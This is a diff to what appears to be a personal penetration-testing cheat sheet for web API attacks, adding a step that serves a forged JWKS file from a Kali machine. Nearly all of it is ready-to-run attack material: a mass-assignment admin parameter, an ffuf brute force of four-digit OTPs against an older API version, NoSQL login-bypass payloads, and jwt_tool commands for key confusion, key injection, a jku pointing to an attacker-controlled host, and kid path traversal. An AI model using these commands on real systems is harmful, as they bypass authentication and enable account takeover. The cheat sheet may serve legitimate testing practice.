@@ -39,7 +39,7 @@ user[username]=THE-NAME&user[password]=THE-PASSWORD&user[admin]=1
 ## A limit only the new version keeps
 An OTP or a reset code tried on the old version of the route:
 seq -w 0000 9999 > otp.txt
-ffuf -u <Scheme>://<WebHost>/api/v2/THE-ROUTE -X POST -H 'Content-Type: application/json' -d '{"email":"THE-EMAIL","otp":"FUZZ"}' -w otp.txt -ac
+ffuf -u <Scheme>://<WebHost>/api/v1/THE-ROUTE -X POST -H 'Content-Type: application/json' -d '{"email":"THE-EMAIL","otp":"FUZZ"}' -w otp.txt -ac
 
 ## Injection in JSON and logins
 {"username": {"$ne": null}, "password": {"$ne": null}}
@@ -79,5 +79,7 @@ RS256 to HS256, with the server's public key from /jwks.json or /.well-known/jwk
 jwt_tool 'THE-JWT' -X k -pk public.pem
 My own key embedded in the header, then a jku pointing at my server:
 jwt_tool 'THE-JWT' -X i
+In another terminal, the key jwt_tool signs with, served from Kali:
+cp ~/.jwt_tool/jwttool_custom_jwks.json jwks.json && python3 -m http.server 80
 jwt_tool 'THE-JWT' -X s -ju http://<LHOST>/jwks.json
 - [ ] kid read as a file: kid set to ../../../../../../dev/null and signed with an empty key, in Burp's JWT Editor
